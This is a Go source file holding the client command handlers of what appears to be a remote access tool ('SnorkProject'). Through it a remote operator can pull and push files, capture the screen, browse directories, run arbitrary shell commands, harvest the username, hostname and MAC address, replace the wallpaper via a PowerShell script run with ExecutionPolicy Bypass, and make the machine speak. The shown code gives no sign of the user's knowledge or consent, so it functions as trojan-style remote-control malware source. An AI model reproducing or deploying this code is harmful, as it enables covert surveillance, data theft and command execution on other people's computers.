package client

import (
	"context"
	"fmt"
	"image/png"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/nb-322/SnorkProject/internal/protocol"
	"github.com/nb-322/SnorkProject/internal/system"
)

func resolvePath(currentPath, input string) string {
	input = strings.TrimSpace(input)
	if runtime.GOOS == "windows" &&
		len(input) >= 2 &&
		input[1] == ':' {

		if len(input) == 2 {
			input += "\\"
		}

		return filepath.Clean(input)
	}

	if filepath.IsAbs(input) {
		return filepath.Clean(input)
	}

	return filepath.Clean(filepath.Join(currentPath, input))
}

func handleDownload(s *Session, args string) error {
	filename := strings.TrimSpace(args)
	if filename == "" {
		protocol.ReliableSend(s.Conn, protocol.Message{
			Command: "download", Response: "error: filename required",
		})
		return nil
	}

	fullPath := resolvePath(s.CurrentPath, filename)
	fmt.Printf("[DEBUG client] handleDownload: fullPath=%s\n", fullPath)

	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		fmt.Printf("[DEBUG client] File not found: %s\n", fullPath)
		protocol.ReliableSend(s.Conn, protocol.Message{
			Command: "download", Response: "File Not Found",
		})
		return nil
	}

	fi, err := os.Stat(fullPath)
	if err == nil {
		fileSize := fi.Size()
		fmt.Printf("[DEBUG client] File found, size: %d bytes\n", fileSize)
	}

	protocol.ReliableSend(s.Conn, protocol.Message{
		Command: "download", Response: "File Exists",
	})

	msg, err := protocol.ReliableReceive(s.Conn)
	if err != nil {
		return fmt.Errorf("download: waiting for send signal: %w", err)
	}
	if !strings.Contains(msg.Response, "send file") {
		return fmt.Errorf("download: unexpected signal: %s", msg.Response)
	}

	s.Conn.SetDeadline(time.Time{})
	fmt.Printf("[DEBUG client] Sending file: %s\n", fullPath)
	return protocol.SendFile(s.Conn, fullPath)
}

func handleUpload(s *Session, args string) error {
	filename := strings.TrimSpace(args)

	fullPath := resolvePath(s.CurrentPath, filename)
	fmt.Printf("[DEBUG client] handleUpload: fullPath=%s\n", fullPath)

	if err := protocol.ReliableSend(s.Conn, protocol.Message{
		Command: "upload", Response: "ready",
	}); err != nil {
		return err
	}

	s.Conn.SetDeadline(time.Time{})
	fmt.Printf("[DEBUG client] Receiving file to: %s\n", fullPath)
	return protocol.ReceiveFile(s.Conn, fullPath)
}

func handleScreenShot(s *Session, args string) error {
	bounds := screenshot.GetDisplayBounds(0)
	img, err := screenshot.CaptureRect(bounds)
	if err != nil {
		protocol.ReliableSend(s.Conn, protocol.Message{
			Command: "screenshot", Response: fmt.Sprintf("error: %v", err),
		})
		return nil
	}
	tmpFile, err := os.CreateTemp("", "snork-screenshot-*.png")
	if err != nil {
		protocol.ReliableSend(s.Conn, protocol.Message{
			Command: "screenshot", Response: fmt.Sprintf("error: CreateTemp: %v", err),
		})
		return nil
	}
	tmpPath := tmpFile.Name()

	if err := png.Encode(tmpFile, img); err != nil {
		tmpFile.Close()
		os.Remove(tmpPath)
		protocol.ReliableSend(s.Conn, protocol.Message{
			Command: "screenshot", Response: fmt.Sprintf("error: Encode: %v", err),
		})
		return nil
	}
	tmpFile.Close()

	_, err = os.Stat(tmpPath)
	if err != nil {
		fmt.Printf("[DEBUG client] handleScreenShot: file not found after creation: %v\n", err)
		os.Remove(tmpPath)
		protocol.ReliableSend(s.Conn, protocol.Message{
			Command: "screenshot", Response: fmt.Sprintf("error: file not found after save: %v", err),
		})
		return nil
	}

	msg := protocol.Message{
		Command:  "screenshot",
		Response: fmt.Sprintf("Screenshot saved to:: %s", tmpPath),
	}
	return protocol.ReliableSend(s.Conn, msg)
}
func handleLS(s *Session, args string) error {
	targetDir := s.CurrentPath

	if strings.TrimSpace(args) != "" {
		targetDir = resolvePath(s.CurrentPath, args)
	}

	fmt.Printf("[DEBUG client] handleLS: listing directory: %s\n", targetDir)

	files, err := os.ReadDir(targetDir)
	if err != nil {
		fmt.Printf("[DEBUG client] handleLS: error reading dir: %v\n", err)
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Command:  "ls",
			Response: fmt.Sprintf("error: %v", err),
		})
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf(" Listing directory: %s\n\n", targetDir))

	for _, file := range files {
		info, err := file.Info()
		if err != nil {
			continue
		}
		typeStr := "<FILE>"
		if file.IsDir() {
			typeStr = "<DIR> "
		}
		sb.WriteString(fmt.Sprintf("%s  %10d  %s\n", typeStr, info.Size(), file.Name()))
	}

	return protocol.ReliableSend(s.Conn, protocol.Message{
		Command:  "ls",
		Response: sb.String(),
	})
}

func handleCD(s *Session, args string) error {
	path := strings.TrimSpace(args)
	fmt.Printf("[DEBUG client] handleCD: input path='%s'\n", path)

	if path == "" {
		home, err := os.UserHomeDir()
		if err != nil {
			s.CurrentPath, _ = os.Getwd()
		} else {
			s.CurrentPath = home
		}
		fmt.Printf("[DEBUG client] handleCD: no path, using home: %s\n", s.CurrentPath)
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Command:  "cd",
			Response: s.CurrentPath,
		})
	}

	if strings.HasPrefix(path, "~") {
		home, err := os.UserHomeDir()
		if err != nil {
			return err
		}
		path = strings.Replace(path, "~", home, 1)
		fmt.Printf("[DEBUG client] handleCD: expanded ~ to: %s\n", path)
	}

	targetPath := resolvePath(s.CurrentPath, path)
	fmt.Printf("[DEBUG client] handleCD: resolved path='%s'\n", targetPath)

	info, err := os.Stat(targetPath)
	if err != nil {
		fmt.Printf("[DEBUG client] handleCD: stat failed for '%s': %v\n", targetPath, err)
		protocol.ReliableSend(s.Conn, protocol.Message{
			Command:  "cd",
			Response: "error: path does not exist: " + err.Error(),
		})
		return nil
	}

	if !info.IsDir() {
		fmt.Printf("[DEBUG client] handleCD: path is not a directory: %s\n", targetPath)
		protocol.ReliableSend(s.Conn, protocol.Message{
			Command:  "cd",
			Response: "error: " + path + " is not a directory",
		})
		return nil
	}

	s.CurrentPath = targetPath
	fmt.Printf("[DEBUG client] handleCD: successfully changed to: %s\n", targetPath)

	return protocol.ReliableSend(s.Conn, protocol.Message{
		Command:  "cd",
		Response: s.CurrentPath,
	})
}
func handleExec(s *Session, args string) error {
	if strings.TrimSpace(args) == "" {
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Response: "error: no command specified",
		})
	}

	ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
	defer cancel()

	var cmd *exec.Cmd

	if runtime.GOOS == "windows" {
		cmd = exec.CommandContext(ctx, "cmd", "/c", "chcp 65001 > nul && "+args)
	} else {
		cmd = exec.CommandContext(ctx, "sh", "-c", args)
	}

	out, err := cmd.CombinedOutput()

	if ctx.Err() == context.DeadlineExceeded {
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Response: "error: command timed out",
		})
	}
	if err != nil {
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Response: fmt.Sprintf("error: %v\n%s", err, string(out)),
		})
	}
	return protocol.ReliableSend(s.Conn, protocol.Message{
		Response: string(out),
	})
}

func handleInfo(s *Session, args string) error {
	msg := system.GetClientInfo()
	msg.Response = fmt.Sprintf("Username: %s, Hostname: %s, MacAddr: %s, Time: %s",
		msg.UserInfo.Username, msg.UserInfo.Hostname, msg.UserInfo.MacAddr, msg.UserInfo.Time)
	return protocol.ReliableSend(s.Conn, *msg)
}

func handleWallpaper(s *Session, args string) error {
	filename := strings.TrimSpace(args)
	fullPath := resolvePath(s.CurrentPath, filename)
	fmt.Printf("[DEBUG client] handleWallpaper: fullpath='%s'\n", fullPath)
	if err := protocol.ReliableSend(s.Conn, protocol.Message{
		Command: "wallpaper", Response: "ready",
	}); err != nil {
		return err
	}
	s.Conn.SetDeadline(time.Time{})
	fmt.Printf("[DEBUG client] Receiving file to: %s\n", fullPath)
	if err := protocol.ReceiveFile(s.Conn, fullPath); err != nil {
		return err
	}
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "windows":
		tempFile, err := os.CreateTemp("", "wallpaper-*.ps1")
		if err != nil {
			return err
		}
		script := "\xEF\xBB\xBF" + `Add-Type -MemberDefinition '[DllImport("user32.dll", CharSet=CharSet.Unicode)]public static extern bool SystemParametersInfo(int a,int b,string c,int d);' -Name W -Namespace P; [P.W]::SystemParametersInfo(20,0,'` + fullPath + `',3)`
		_, err = io.WriteString(tempFile, script)
		if err != nil {
			return err
		}
		tempFile.Close()
		cmd = exec.Command("powershell", "-ExecutionPolicy", "Bypass", "-File", tempFile.Name())
		defer os.Remove(tempFile.Name())
	case "darwin":
		cmd = exec.Command("osascript", "-e",
			`tell application "System Events" to set picture of current desktop to "`+fullPath+`"`)
	case "linux":
		cmd = exec.Command("gsettings", "set", "org.gnome.desktop.background", "picture-uri", "file://"+fullPath)
	default:
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Command: "wallpaper", Response: "error: unsupported OS",
		})
	}
	if out, err := cmd.CombinedOutput(); err != nil {
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Command: "wallpaper", Response: fmt.Sprintf("error: %v: %s", err, out),
		})
	} else {
		fmt.Printf("[DEBUG] osascript output: %q\n", string(out))
	}

	return protocol.ReliableSend(s.Conn, protocol.Message{Command: "wallpaper", Response: "success"})

}

func handleSpeech(s *Session, args string) error {
	if strings.TrimSpace(args) == "" {
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Response: "error: no text to speak",
			Command:  "speak",
		})
	}
	err := speak(args)
	if err != nil {
		return protocol.ReliableSend(s.Conn, protocol.Message{
			Response: "error: can't speak",
			Command:  "speak",
		})
	}
	return protocol.ReliableSend(s.Conn, protocol.Message{
		Response: "success",
		Command:  "speak",
	})
}
